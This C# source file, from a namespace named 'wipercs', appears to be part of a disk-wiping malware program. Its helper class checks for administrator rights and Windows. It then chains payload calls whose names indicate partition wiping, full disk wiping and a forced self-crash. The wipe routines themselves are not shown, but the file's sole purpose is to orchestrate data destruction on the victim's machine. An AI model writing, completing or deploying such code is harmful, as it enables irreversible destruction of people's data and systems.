namespace wipercs;

using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;

public class Helper
{
    public static bool IsElevated()
    {
        return WindowsIdentity.GetCurrent().Owner
            .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
    }

    public static bool IsWindows()
    {
        return RuntimeInformation.IsOSPlatform(OSPlatform.Windows);
    }

    public static void Exit(int time)
    {
        Thread.Sleep(time * 1000);
        Environment.Exit(0);
    }

    public static void initWindowsPayload()
    {
        bool success = WindowsPayload.RF();
        
        if (success)
        {
            success = WindowsPayload.PartWipe();
        }
        
        if (success)
        {
            success = WindowsPayload.DiskWipe();
        }
        
        WindowsPayload.CrashSelf();
    }
}